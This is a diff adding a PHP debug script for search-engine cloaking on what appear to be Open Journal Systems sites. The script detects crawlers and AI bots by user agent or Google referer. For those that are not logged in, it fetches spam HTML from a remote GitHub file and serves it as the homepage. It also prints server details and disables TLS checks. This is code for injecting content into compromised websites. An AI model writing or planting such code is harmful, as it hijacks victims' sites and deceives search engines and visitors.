@@ -1,0 +1,111 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 1);
+
+echo "=== START DEBUG ===<br><br>";
+
+// 1. Test fungsi
+echo "1. Test get_remote_content function...<br>";
+function get_remote_content($url) {
+    if (!function_exists('curl_init')) {
+        echo "❌ cURL tidak tersedia, pakai file_get_contents<br>";
+        return @file_get_contents($url);
+    }
+    echo "✅ cURL tersedia<br>";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Googlebot/2.1');
+    $res = curl_exec($ch);
+    if ($res === false) {
+        echo "❌ cURL error: " . curl_error($ch) . "<br>";
+        return false;
+    }
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    echo "✅ HTTP Code: $code<br>";
+    return ($code === 200) ? $res : false;
+}
+
+// 2. Test ambil konten
+echo "<br>2. Test fetch remote content...<br>";
+$targetUrl = 'https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/cloking-galak-kal-kal.txt';
+$html = get_remote_content($targetUrl);
+if ($html) {
+    echo "✅ Berhasil mengambil konten (" . strlen($html) . " bytes)<br>";
+    echo "Preview: " . substr($html, 0, 100) . "...<br>";
+} else {
+    echo "❌ Gagal mengambil konten<br>";
+}
+
+// 3. Test environment
+echo "<br>3. Test environment...<br>";
+echo "PHP Version: " . phpversion() . "<br>";
+echo "Memory Limit: " . ini_get('memory_limit') . "<br>";
+echo "Max Execution Time: " . ini_get('max_execution_time') . "<br>";
+echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "<br>";
+
+// 4. Simulasikan kondisi bot
+echo "<br>4. Simulasi kondisi...<br>";
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$clean_uri = strtok($uri, '?');
+$isLogged = !empty($_COOKIE['OMPSID']) || !empty($_COOKIE['OJSSID']) || !empty($_COOKIE['OJSESS']);
+
+echo "User Agent: $ua<br>";
+echo "URI: $uri<br>";
+echo "Clean URI: $clean_uri<br>";
+echo "Is Logged: " . ($isLogged ? 'Yes' : 'No') . "<br>";
+
+$botAgents = ['googlebot','google-site-verification','google-inspectiontool','oai-searchbot','bingbot','crawler','gptbot','ahrefsbot','yandex','duckduckbot','baiduspider','chrome-lighthouse'];
+$isBot = false;
+foreach ($botAgents as $agent) {
+    if (strpos($ua, $agent) !== false) {
+        $isBot = true;
+        echo "✅ Terdeteksi sebagai bot (agent: $agent)<br>";
+        break;
+    }
+}
+if (strpos($referer, 'google') !== false) {
+    $isBot = true;
+    echo "✅ Terdeteksi dari Google referer<br>";
+}
+
+echo "Is Bot: " . ($isBot ? 'Yes' : 'No') . "<br>";
+
+// 5. Jalankan logika utama
+echo "<br>5. Jalankan logika utama...<br>";
+if ($isBot && !$isLogged) {
+    echo "✅ Kondisi terpenuhi: BOT dan NOT LOGGED<br>";
+    $targetUrl = null;
+    
+    if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
+        $targetUrl = 'https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/cloking-galak-kal-kal.txt';
+        echo "✅ Target URL set: $targetUrl<br>";
+    }
+    
+    if ($targetUrl) {
+        echo "✅ Menampilkan konten...<br>";
+        $html = get_remote_content($targetUrl);
+        if ($html) {
+            header("Content-Type: text/html; charset=utf-8");
+            echo $html;
+            exit;
+        } else {
+            echo "❌ Gagal menampilkan konten<br>";
+        }
+    }
+} else {
+    echo "❌ Kondisi TIDAK terpenuhi<br>";
+    echo "Kenapa: " . (!$isBot ? "Bukan bot" : "") . (!$isLogged ? "User sudah login" : "") . "<br>";
+}
+
+echo "<br>=== END DEBUG ===<br>";
+?>
